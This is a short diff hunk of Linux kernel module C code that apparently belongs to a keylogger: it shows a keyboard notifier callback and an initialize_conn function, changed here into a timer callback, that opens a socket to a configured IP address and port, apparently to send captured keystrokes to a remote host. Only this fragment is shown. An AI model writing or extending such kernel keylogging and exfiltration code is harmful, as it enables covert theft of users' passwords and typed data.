@@ -57,7 +57,9 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
 }
 
 
-void initialize_conn() {
+void initialize_conn(struct timer_list *t) {
+    int result;
+
     result = create_socket(IP_ADDRESS, PORT);
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
